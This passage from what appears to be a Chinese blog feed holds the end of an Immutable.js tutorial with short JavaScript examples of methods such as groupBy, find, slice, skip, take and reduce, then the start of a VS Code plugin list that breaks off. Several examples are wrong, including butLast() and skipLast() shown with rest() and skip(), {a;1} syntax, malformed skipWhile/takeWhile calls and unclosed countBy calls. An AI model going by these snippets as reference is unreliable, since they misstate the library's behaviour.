).sort(<span class="function">(<span class="params">a,b</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (a &lt; b) &#123; <span class="keyword">return</span> <span class="number">-1</span>; &#125;</span><br><span class="line">  <span class="keyword">if</span> (a &gt; b) &#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line">  <span class="keyword">if</span> (a === b) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//Map &#123;b: 1, c: 2, a: 3, d: 5&#125;</span></span><br><span class="line">Immutable.fromJS( &#123;<span class="attr">b</span>:<span class="number">1</span>, <span class="attr">a</span>: <span class="number">3</span>, <span class="attr">c</span>: <span class="number">2</span>, <span class="attr">d</span>:<span class="number">5</span>&#125; ).sortBy(<span class="function">(<span class="params">value, key, obj</span>)=&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> value</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//Map &#123;b: 1, c: 2, a: 3, d: 5&#125;</span></span><br></pre></td></tr></table></figure><h4 id="4-8-8-groupBy"><a href="#4-8-8-groupBy" class="headerlink" title="4.8.8 groupBy"></a>4.8.8 groupBy</h4><blockquote><p><code>分组 groupBy</code>  作用：对数据进行分组</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> listOfMaps = List([</span><br><span class="line">  <span class="built_in">Map</span>(&#123; <span class="attr">v</span>: <span class="number">0</span> &#125;),</span><br><span class="line">  <span class="built_in">Map</span>(&#123; <span class="attr">v</span>: <span class="number">1</span> &#125;),</span><br><span class="line">  <span class="built_in">Map</span>(&#123; <span class="attr">v</span>: <span class="number">1</span> &#125;),</span><br><span class="line">  <span class="built_in">Map</span>(&#123; <span class="attr">v</span>: <span class="number">0</span> &#125;),</span><br><span class="line">  <span class="built_in">Map</span>(&#123; <span class="attr">v</span>: <span class="number">2</span> &#125;)</span><br><span class="line">])</span><br><span class="line"><span class="keyword">const</span> groupsOfMaps = listOfMaps.groupBy(<span class="function"><span class="params">x</span> =&gt;</span> x.get(<span class="string">'v'</span>))</span><br><span class="line"><span class="comment">// Map &#123;</span></span><br><span class="line"><span class="comment">//   0: List [ Map&#123; "v": 0 &#125;, Map &#123; "v": 0 &#125; ],</span></span><br><span class="line"><span class="comment">//   1: List [ Map&#123; "v": 1 &#125;, Map &#123; "v": 1 &#125; ],</span></span><br><span class="line"><span class="comment">//   2: List [ Map&#123; "v": 2 &#125; ],</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure><h3 id="4-9-查找数据"><a href="#4-9-查找数据" class="headerlink" title="4.9 查找数据"></a>4.9 查找数据</h3><h4 id="4-9-1-indexOf-lastIndexOf"><a href="#4-9-1-indexOf-lastIndexOf" class="headerlink" title="4.9.1 indexOf lastIndexOf"></a>4.9.1 indexOf lastIndexOf</h4><blockquote><p>Map不存在此方法 和<code>js</code>数组中的方法相同，查找第一个或者最后一个<code>value</code>的<code>index</code>值，找不到则返回<code>-1</code></p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Immutable.fromJS([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]).indexof(<span class="number">3</span>) <span class="comment">//2</span></span><br><span class="line">Immutable.fromJS([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]).lastIndexof(<span class="number">3</span>) <span class="comment">//2</span></span><br></pre></td></tr></table></figure><h4 id="4-9-2-findIndex-、-findLastIndex"><a href="#4-9-2-findIndex-、-findLastIndex" class="headerlink" title="4.9.2 findIndex() 、 findLastIndex()"></a>4.9.2 <code>findIndex() 、 findLastIndex()</code></h4><blockquote><p><code>Map</code>不存在此方法,查找满足要求的元素的<code>index</code>值</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Immutable.fromJS([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]).findIndex(<span class="function">(<span class="params">value,index,array</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value%<span class="number">2</span> === <span class="number">0</span>;</span><br><span class="line">&#125;)   <span class="comment">// 1</span></span><br><span class="line">Immutable.fromJS([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]).findLastIndex(<span class="function">(<span class="params">value,index,array</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> index%<span class="number">2</span> === <span class="number">0</span>;</span><br><span class="line">&#125;)  <span class="comment">// 3</span></span><br></pre></td></tr></table></figure><h4 id="4-9-3-find-、-findLast"><a href="#4-9-3-find-、-findLast" class="headerlink" title="4.9.3 find() 、 findLast()"></a>4.9.3 <code>find() 、 findLast()</code></h4><blockquote><p>查找满足条件的元素的<code>value</code>值</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Immutable.fromJS([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]).find(<span class="function">(<span class="params">value,index,array</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value%<span class="number">2</span> === <span class="number">0</span>;</span><br><span class="line">&#125;)  <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line">Immutable.fromJS([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]).findLast(<span class="function">(<span class="params">value,index,array</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value%<span class="number">2</span> === <span class="number">0</span>;</span><br><span class="line">&#125;)  <span class="comment">// 4</span></span><br></pre></td></tr></table></figure><h4 id="4-9-4-findKey-、-findLastKey"><a href="#4-9-4-findKey-、-findLastKey" class="headerlink" title="4.9.4 findKey() 、 findLastKey()"></a>4.9.4 <code>findKey() 、 findLastKey()</code></h4><blockquote><p>查找满足条件的元素的<code>key</code>值</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Immutable.fromJS([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]).findKey(<span class="function">(<span class="params">value,index,array</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value%<span class="number">2</span> === <span class="number">0</span>;</span><br><span class="line">&#125;)  <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line">Immutable.fromJS([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]).findLastKey(<span class="function">(<span class="params">value,index,array</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value%<span class="number">2</span> === <span class="number">0</span>;</span><br><span class="line">&#125;)  <span class="comment">// 3</span></span><br></pre></td></tr></table></figure><h4 id="4-9-5-findEntry-、-findLastEntry"><a href="#4-9-5-findEntry-、-findLastEntry" class="headerlink" title="4.9.5 findEntry() 、 findLastEntry()"></a>4.9.5 <code>findEntry() 、 findLastEntry()</code></h4><blockquote><p>查找满足条件的元素的键值对 <code>key:value</code></p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Immutable.fromJS([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]).findEntry(<span class="function">(<span class="params">value,index,array</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value%<span class="number">2</span> === <span class="number">0</span>;</span><br><span class="line">&#125;)  <span class="comment">// [1,2]</span></span><br><span class="line"></span><br><span class="line">Immutable.fromJS([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]).findLastEntry(<span class="function">(<span class="params">value,index,array</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value%<span class="number">2</span> === <span class="number">0</span>;</span><br><span class="line">&#125;)  <span class="comment">// [3,4]</span></span><br></pre></td></tr></table></figure><h4 id="4-9-6-keyOf-lastKeyOf"><a href="#4-9-6-keyOf-lastKeyOf" class="headerlink" title="4.9.6 keyOf() lastKeyOf()"></a>4.9.6 <code>keyOf() lastKeyOf()</code></h4><blockquote><p>查找某一个<code>value</code>对应的<code>key</code>值</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Immutable.fromJS([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]).keyOf(<span class="number">2</span>) <span class="comment">//1</span></span><br><span class="line">Immutable.fromJS([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]).lastKeyOf(<span class="number">2</span>) <span class="comment">//1</span></span><br></pre></td></tr></table></figure><h4 id="4-9-7-max-、-maxBy"><a href="#4-9-7-max-、-maxBy" class="headerlink" title="4.9.7 max() 、 maxBy()"></a>4.9.7 <code>max() 、 maxBy()</code></h4><blockquote><p>查找最大值</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Immutable.fromJS([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]).max() <span class="comment">//4</span></span><br><span class="line"></span><br><span class="line">Immutable.fromJS([&#123;a;<span class="number">1</span>&#125;,&#123;<span class="attr">a</span>:<span class="number">2</span>&#125;,&#123;<span class="attr">a</span>: <span class="number">3</span>&#125;,&#123;<span class="attr">a</span>:<span class="number">4</span>&#125;]).maxBy(<span class="function">(<span class="params">value,index,array</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value.get(<span class="string">'a'</span>)</span><br><span class="line">&#125;)  <span class="comment">//&#123;a:4&#125;</span></span><br></pre></td></tr></table></figure><h4 id="4-9-8-min-、-minBy"><a href="#4-9-8-min-、-minBy" class="headerlink" title="4.9.8 min() 、 minBy()"></a>4.9.8 <code>min() 、 minBy()</code></h4><blockquote><p>查找最小值</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Immutable.fromJS([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]).min() <span class="comment">//1</span></span><br><span class="line"></span><br><span class="line">Immutable.fromJS([&#123;a;<span class="number">1</span>&#125;,&#123;<span class="attr">a</span>:<span class="number">2</span>&#125;,&#123;<span class="attr">a</span>: <span class="number">3</span>&#125;,&#123;<span class="attr">a</span>:<span class="number">4</span>&#125;]).minBy(<span class="function">(<span class="params">value,index,array</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value.get(<span class="string">'a'</span>)</span><br><span class="line">&#125;)  <span class="comment">//&#123;a:1&#125;</span></span><br></pre></td></tr></table></figure><h3 id="4-10-创建子集"><a href="#4-10-创建子集" class="headerlink" title="4.10 创建子集"></a>4.10 创建子集</h3><h4 id="4-10-1-slice"><a href="#4-10-1-slice" class="headerlink" title="4.10.1 slice()"></a>4.10.1 <code>slice()</code></h4><blockquote><p>和原生<code>js</code>中数组的<code>slice</code>数组一样，包含两个参数，<code>start</code>和<code>end</code>，<code>start</code>代表开始截取的位置，<code>end</code>代表结束的位置，不包括第<code>end</code>的元素。若不包括<code>end</code>，则返回整个对象，若<code>end</code>为负数，则返回（<code>start</code>，<code>length-end</code>）对应的数据。若<code>start</code>只有一个并且为负数，则返回最后的<code>end</code>个元素</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Immutable.fromJS([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]).slice(<span class="number">0</span>); <span class="comment">//[1,2,3,4]</span></span><br><span class="line">Immutable.fromJS([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]).slice(<span class="number">0</span>,<span class="number">2</span>); <span class="comment">//[1,2]</span></span><br><span class="line">Immutable.fromJS([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]).slice(<span class="number">-2</span>); <span class="comment">//[3,4]</span></span><br><span class="line">Immutable.fromJS([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]).slice(<span class="number">0</span>,<span class="number">-2</span>); <span class="comment">//[1,2]</span></span><br></pre></td></tr></table></figure><h4 id="4-10-2-rest"><a href="#4-10-2-rest" class="headerlink" title="4.10.2 rest()"></a>4.10.2 <code>rest()</code></h4><blockquote><p>返回除第一个元素之外的所有元素</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Immutable.fromJS([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]).rest()<span class="comment">//[2,3,4]</span></span><br></pre></td></tr></table></figure><h4 id="4-10-3butLast"><a href="#4-10-3butLast" class="headerlink" title="4.10.3butLast()"></a>4.10.3<code>butLast()</code></h4><blockquote><p>返回除最后一个元素之外的所有元素</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Immutable.fromJS([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]).rest()<span class="comment">//[1,2,3]</span></span><br></pre></td></tr></table></figure><h4 id="4-10-4-skip"><a href="#4-10-4-skip" class="headerlink" title="4.10.4 skip()"></a>4.10.4 <code>skip()</code></h4><blockquote><p>有一个参数<code>n</code>, 返回截掉前<code>n</code>个元素之后剩下的所有元素</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Immutable.fromJS([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]).skip(<span class="number">1</span>)<span class="comment">//[2,3,4]</span></span><br></pre></td></tr></table></figure><h4 id="4-10-5-skipLast"><a href="#4-10-5-skipLast" class="headerlink" title="4.10.5 skipLast()"></a>4.10.5 <code>skipLast()</code></h4><blockquote><p>有一个参数<code>n</code>, 返回截掉最后n个元素之后剩下的所有元素</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Immutable.fromJS([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]).skip(<span class="number">1</span>)<span class="comment">//[1,2,3]</span></span><br></pre></td></tr></table></figure><h4 id="4-10-6-skipWhile"><a href="#4-10-6-skipWhile" class="headerlink" title="4.10.6 skipWhile()"></a>4.10.6 <code>skipWhile()</code></h4><blockquote><p>返回从第一次返回<code>false</code>之后的所有元素</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Immutable.fromJS([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]).skipWhile(list.skipWhile(<span class="function">(<span class="params">value,index,list</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value &gt; <span class="number">2</span>;</span><br><span class="line">&#125;))<span class="comment">// [1,2,3,4]</span></span><br><span class="line">skipUntil()</span><br></pre></td></tr></table></figure><h4 id="4-10-7-take"><a href="#4-10-7-take" class="headerlink" title="4.10.7 take()"></a>4.10.7 <code>take()</code></h4><blockquote><p>有一个参数n, 返回前n个元素</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Immutable.fromJS([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]).take(<span class="number">2</span>)<span class="comment">//[1,2]</span></span><br></pre></td></tr></table></figure><h4 id="4-10-8-takeLast"><a href="#4-10-8-takeLast" class="headerlink" title="4.10.8 takeLast()"></a>4.10.8 <code>takeLast()</code></h4><blockquote><p>有一个参数n, 返回最后n个元素</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Immutable.fromJS([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]).takeLast(<span class="number">2</span>)<span class="comment">//[3,4]</span></span><br></pre></td></tr></table></figure><h4 id="4-10-9-takeWhile"><a href="#4-10-9-takeWhile" class="headerlink" title="4.10.9 takeWhile()"></a>4.10.9 <code>takeWhile()</code></h4><blockquote><p>返回从第一次返回<code>false</code>之前的所有元素</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Immutable.fromJS([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]).skipWhile(list.takeWhile(<span class="function">(<span class="params">value,index,list</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value &gt; <span class="number">2</span>;</span><br><span class="line">&#125;))<span class="comment">// []</span></span><br><span class="line">takeUntil()</span><br></pre></td></tr></table></figure><h3 id="4-11-处理数据"><a href="#4-11-处理数据" class="headerlink" title="4.11 处理数据"></a>4.11 处理数据</h3><h4 id="4-11-1-reduce"><a href="#4-11-1-reduce" class="headerlink" title="4.11.1 reduce()"></a>4.11.1 <code>reduce()</code></h4><blockquote><p>和<code>js</code>中数组中的<code>reduce</code>相同,按索引升序的顺序处理元素</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Immutable.fromJS([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]).reduce(<span class="function">(<span class="params">pre,next,index,arr</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(pre+next)</span><br><span class="line">  <span class="keyword">return</span> pre+next; </span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 3 6 10</span></span><br></pre></td></tr></table></figure><h4 id="4-11-2-reduceRight"><a href="#4-11-2-reduceRight" class="headerlink" title="4.11.2 reduceRight()"></a>4.11.2 <code>reduceRight()</code></h4><blockquote><p>和<code>js</code>中数组中的<code>reduce</code>相同,按索引降序的顺序处理元素</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Immutable.fromJS([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]).reduceRight(<span class="function">(<span class="params">pre,next,index,arr</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(pre+next)</span><br><span class="line">  <span class="keyword">return</span> pre+next; </span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 7 9 10</span></span><br></pre></td></tr></table></figure><h4 id="4-11-3-every"><a href="#4-11-3-every" class="headerlink" title="4.11.3 every()"></a>4.11.3 <code>every()</code></h4><blockquote><p>作用：判断整个对象总中所有的元素是不是都满足某一个条件，都满足返回`true，反之返回false</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Immutable.fromJS([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]).every(<span class="function">(<span class="params">value,index,arr</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value &gt; <span class="number">2</span></span><br><span class="line">&#125;) <span class="comment">// false</span></span><br></pre></td></tr></table></figure><h4 id="4-11-4-some"><a href="#4-11-4-some" class="headerlink" title="4.11.4 some()"></a>4.11.4 <code>some()</code></h4><blockquote><p>判断整个对象总中所有的元素是不是存在满足某一个条件的元素，若存在返回true，反之返回false</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Immutable.fromJS([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]).some(<span class="function">(<span class="params">value,index,arr</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value &gt; <span class="number">2</span></span><br><span class="line">&#125;) <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h4 id="4-11-5-join"><a href="#4-11-5-join" class="headerlink" title="4.11.5 join()"></a>4.11.5 <code>join()</code></h4><blockquote><p>作用：同<code>js</code>中数组的<code>join</code>方法。把转换为字符串</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Immutable.fromJS([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]).join(<span class="string">','</span>) <span class="comment">//1,2,3,4</span></span><br></pre></td></tr></table></figure><h4 id="4-11-6-isEmpty"><a href="#4-11-6-isEmpty" class="headerlink" title="4.11.6 isEmpty()"></a>4.11.6 <code>isEmpty()</code></h4><blockquote><p>作用：判断是否为空</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Immutable.fromJS([]).isEmpty(); <span class="comment">// true</span></span><br><span class="line">Immutable.fromJS(&#123;&#125;).isEmpty(); <span class="comment">// true</span></span><br><span class="line">count()</span><br></pre></td></tr></table></figure><h4 id="4-11-7-countBy"><a href="#4-11-7-countBy" class="headerlink" title="4.11.7 countBy()"></a>4.11.7 <code>countBy()</code></h4><blockquote><p>与<code>count</code>不同的是，<code>countBy</code>返回一个对象</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> list = Immutable.fromJS([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]);</span><br><span class="line"><span class="keyword">const</span> map = Immutable.fromJS(&#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">b</span>:<span class="number">2</span>,<span class="attr">c</span>:<span class="number">3</span>,<span class="attr">d</span>:<span class="number">4</span>&#125;);</span><br><span class="line"></span><br><span class="line">list.countBy(<span class="function">(<span class="params">value,index,list</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value &gt; <span class="number">2</span>;</span><br><span class="line">&#125; <span class="comment">//&#123;false: 2, true: 2&#125;</span></span><br><span class="line"></span><br><span class="line">map.countBy(<span class="function">(<span class="params">value,index,list</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> value &gt; <span class="number">2</span>;</span><br><span class="line">&#125; <span class="comment">//&#123;false: 2, true: 2&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、fromJS&quot;&gt;&lt;a href=&quot;#一、fromJS&quot; class=&quot;headerlink&quot; title=&quot;一、fromJS&quot;&gt;&lt;/a&gt;一、fromJS&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;作用：是最最常用的将原生JS数据转换为&lt;code&gt;ImmutableJS&lt;/co
      
    
    </summary>
    
      <category term="Front-End" scheme="http://blog.poetries.top/categories/Front-End/"/>
    
    
      <category term="react" scheme="http://blog.poetries.top/tags/react/"/>
    
      <category term="Immutable" scheme="http://blog.poetries.top/tags/Immutable/"/>
    
  </entry>
  
  <entry>
    <title>VS Code折腾记</title>
    <link href="http://blog.poetries.top/2018/02/02/vsc-config/"/>
    <id>http://blog.poetries.top/2018/02/02/vsc-config/</id>
    <published>2018-02-02T03:40:43.000Z</published>
    <updated>2018-04-10T03:33:13.995Z</updated>
    
    <content type="html"><![CDATA[<h2 id="VS-Code常用插件"><a href="#VS-Code常用插件" class="headerlink" title="VS Code常用插件"></a>VS Code常用插件</h2><ul><li><code>Auto Close Tag</code> （自动关闭HTML标签）</li><li><code>Auto Rename Tag</code> (HTML标签自动改名)</li><li><code>Babel ES6/ES7</code> </li><li><code>Beautify css/sass/scss/less</code></li><li><code>Brackets Light</code> (主题)</li><li><code>Complete JSDoc Tags</code> (js文档注释提示)</li><li><code>Git History</code> (查看git提交记录)</li><li><code>HTML CSS Support</code> (HTML中提示可用的class)</li><li><code>npm Intellisense</code> (提示可以require的模块名称)</li><li><code>One Dark Theme</code> (主题)</li><li><code>Path Intellisense</code> (路径补全)</li><li><code>Reactjs code snippets</code> (reactjs代码提示)</li><li><code>Sass</code></li><li><code>SCSS IntelliSense Preview</code>  SCSS智能提醒，配置强大</li><li><code>Sublime Babel</code></li><li><code>VSCode Great Icons</code> (文件图标)</li><li><code>vscode-icons</code> （文件图标）</li><li><code>Beautify</code> - HTML、CSS、JS、JSON语法高亮</li><li><code>Guides</code> - 代码对齐辅助线</li><li><code>OneDark</code>主题</li><li><code>JavaScript (ES6) Code Snippets</code> (代码片段插件)</li><li><code>Project Manager</code> (项目管理器插件) 简单的项目管理器,可以在你的编辑器中快速切换项目</li><li><code>Sync Settings</code> (设置同步插件)在电脑上移植你的插件和设置是轻而易举的事</li><li><code>Git History</code> (<code>Git</code> 历史记录插件) 可视化的 <code>Git</code> 历史记录插件</li><li><code>Document This</code> (<code>JSDoc</code>注释插件)</li><li><code>npm Intellisense</code> (npm 模块导入插件)</li><li><code>Align</code> (代码对齐插件)</li><li><code>amVim</code> (<code>vim</code> 插件)</li><li><code>Faker</code> 可以生成随机的名称，地址，图像，电话号码</li><li><code>Color Info</code> 颜色信息及转换 </li><li><code>SVG Viewer SVG</code>预览</li><li><code>TODO Highlight</code> TODO 高亮</li><li><code>Minify</code> 代码压缩 </li><li><code>Regex Previewer</code> 正则表达式预览</li><li><code>File Tree View</code>  提供几个常见编程语言的函数或状态的树集合展示,可以快速点击跳转!</li><li><code>JavaScript Test Runner Preview</code> 快速执行单元测试,支持 <code>Mocha</code> 和 <code>Jest</code></li><li><code>NPM-Scripts</code> 在侧边栏可视化执行 <code>npm</code> 命令(项目内的 <code>package.json</code>)</li><li><code>colorize</code>会给颜色代码增加一个当前匹配代码颜色的背景</li><li><code>vscode-fake</code>——生成各种假数据类型。（姓名，电话）</li><li><code>vscode-CSS Peek</code>——<code>class</code>类定义跳转</li><li><code>vscode-Git Lens</code>—–增强<code>vscode</code>的<code>git</code>管理工具</li><li><code>vscode-Live Server</code>—–<code>http</code>服务器（相当于使用<code>nodejs</code>的<code>http-server</code> ）</li><li><code>EditorConfig for VS Code EditorConfig</code> 插件</li><li><code>Emoji</code> 在代码中输入<code>emoji</code></li><li><code>File Peek</code> 根据路径字符串，快速定位到文件</li><li><code>Font-awesome codes for html FontAwesome</code>提示代码段</li><li><code>Guides</code> 高亮缩进基准线</li><li><code>JavaScript (ES6) code snippets ES6</code>语法代码段</li><li><code>language-stylus Stylus</code>语法高亮和提示</li><li><code>Lodash Lodash</code>代码段</li><li><code>Prettify JSON</code> 格式化<code>JSON</code></li><li><code>Test Spec Generator</code> 测试用例生成（支持<code>chai</code>、<code>should</code>、<code>jasmine</code>）</li><li><code>vetur</code> 目前比较好的<code>Vue</code>语法高亮</li><li><code>cssrem</code> css值转rem插件</li><li><code>polacode</code> 代码截图工具</li></ul><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 